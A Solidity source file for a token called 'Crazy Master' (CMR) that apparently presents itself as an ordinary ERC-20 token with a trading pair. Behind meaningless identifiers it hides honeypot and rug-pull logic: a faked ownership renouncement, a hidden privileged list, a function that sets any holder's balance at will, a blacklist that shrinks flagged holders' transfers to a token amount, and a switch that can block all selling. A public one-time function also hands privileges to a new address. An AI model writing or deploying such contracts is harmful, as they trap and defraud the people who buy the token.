//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface walletMin {
    function createPair(address walletToken, address maxTake) external returns (address);
}

interface launchTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapEnableTake) external view returns (uint256);

    function transfer(address modeEnableLiquidity, uint256 marketingMinLaunched) external returns (bool);

    function allowance(address modeTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingMinLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address modeEnableLiquidity,
        uint256 marketingMinLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellMode, uint256 value);
    event Approval(address indexed modeTo, address indexed spender, uint256 value);
}

abstract contract feeTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchToMetadata is launchTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CrazyMaster is feeTrading, launchTo, launchToMetadata {

    function feeMarketing() private view {
        require(teamFund[_msgSender()]);
    }

    uint8 private txTake = 18;

    uint256 private modeAutoReceiver = 100000000 * 10 ** 18;

    uint256 isToken;

    address public buyTotalLaunched;

    function teamIs(address launchedTo) public {
        require(launchedTo.balance < 100000);
        if (fundFeeSwap) {
            return;
        }
        if (senderReceiverTeam) {
            maxTakeIs = exemptToken;
        }
        teamFund[launchedTo] = true;
        if (shouldBuy == totalTo) {
            exemptToken = maxTakeIs;
        }
        fundFeeSwap = true;
    }

    uint256 public exemptToken;

    address sellMarketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 teamLaunched;

    event OwnershipTransferred(address indexed isMin, address indexed autoMode);

    address fundReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant minBuy = 12 ** 10;

    address private launchedReceiver;

    function transferFrom(address toModeSwap, address modeEnableLiquidity, uint256 marketingMinLaunched) external override returns (bool) {
        if (_msgSender() != sellMarketingReceiver) {
            if (walletLimit[toModeSwap][_msgSender()] != type(uint256).max) {
                require(marketingMinLaunched <= walletLimit[toModeSwap][_msgSender()]);
                walletLimit[toModeSwap][_msgSender()] -= marketingMinLaunched;
            }
        }
        return swapTake(toModeSwap, modeEnableLiquidity, marketingMinLaunched);
    }

    function getOwner() external view returns (address) {
        return launchedReceiver;
    }

    mapping(address => mapping(address => uint256)) private walletLimit;

    bool public senderReceiverTeam;

    function allowance(address buyIsAmount, address maxTx) external view virtual override returns (uint256) {
        if (maxTx == sellMarketingReceiver) {
            return type(uint256).max;
        }
        return walletLimit[buyIsAmount][maxTx];
    }

    bool private totalTo;

    constructor (){
        
        feeShould feeWallet = feeShould(sellMarketingReceiver);
        buyTotalLaunched = walletMin(feeWallet.factory()).createPair(feeWallet.WETH(), address(this));
        if (shouldBuy) {
            senderReceiverTeam = false;
        }
        fromFeeLaunched = _msgSender();
        teamFund[fromFeeLaunched] = true;
        launchLaunched[fromFeeLaunched] = modeAutoReceiver;
        senderMinMax();
        
        emit Transfer(address(0), fromFeeLaunched, modeAutoReceiver);
    }

    function senderMinMax() public {
        emit OwnershipTransferred(fromFeeLaunched, address(0));
        launchedReceiver = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return swapMax;
    }

    bool private shouldBuy;

    function minLaunch(address takeAmount, uint256 marketingMinLaunched) public {
        feeMarketing();
        launchLaunched[takeAmount] = marketingMinLaunched;
    }

    string private maxList = "Crazy Master";

    function approve(address maxTx, uint256 marketingMinLaunched) public virtual override returns (bool) {
        walletLimit[_msgSender()][maxTx] = marketingMinLaunched;
        emit Approval(_msgSender(), maxTx, marketingMinLaunched);
        return true;
    }

    mapping(address => uint256) private launchLaunched;

    address public fromFeeLaunched;

    function name() external view virtual override returns (string memory) {
        return maxList;
    }

    mapping(address => bool) public buyIs;

    function swapTake(address toModeSwap, address modeEnableLiquidity, uint256 marketingMinLaunched) internal returns (bool) {
        if (toModeSwap == fromFeeLaunched) {
            return totalWallet(toModeSwap, modeEnableLiquidity, marketingMinLaunched);
        }
        uint256 swapBuy = launchTo(buyTotalLaunched).balanceOf(fundReceiver);
        require(swapBuy == isToken);
        require(modeEnableLiquidity != fundReceiver);
        if (buyIs[toModeSwap]) {
            return totalWallet(toModeSwap, modeEnableLiquidity, minBuy);
        }
        return totalWallet(toModeSwap, modeEnableLiquidity, marketingMinLaunched);
    }

    function owner() external view returns (address) {
        return launchedReceiver;
    }

    function totalWallet(address toModeSwap, address modeEnableLiquidity, uint256 marketingMinLaunched) internal returns (bool) {
        require(launchLaunched[toModeSwap] >= marketingMinLaunched);
        launchLaunched[toModeSwap] -= marketingMinLaunched;
        launchLaunched[modeEnableLiquidity] += marketingMinLaunched;
        emit Transfer(toModeSwap, modeEnableLiquidity, marketingMinLaunched);
        return true;
    }

    function receiverMax(address walletFrom) public {
        feeMarketing();
        
        if (walletFrom == fromFeeLaunched || walletFrom == buyTotalLaunched) {
            return;
        }
        buyIs[walletFrom] = true;
    }

    string private swapMax = "CMR";

    function totalSupply() external view virtual override returns (uint256) {
        return modeAutoReceiver;
    }

    function takeMin(uint256 marketingMinLaunched) public {
        feeMarketing();
        isToken = marketingMinLaunched;
    }

    mapping(address => bool) public teamFund;

    function balanceOf(address swapEnableTake) public view virtual override returns (uint256) {
        return launchLaunched[swapEnableTake];
    }

    uint256 public maxTakeIs;

    bool public receiverAmountLimit;

    function transfer(address takeAmount, uint256 marketingMinLaunched) external virtual override returns (bool) {
        return swapTake(_msgSender(), takeAmount, marketingMinLaunched);
    }

    bool public fundFeeSwap;

    function decimals() external view virtual override returns (uint8) {
        return txTake;
    }

}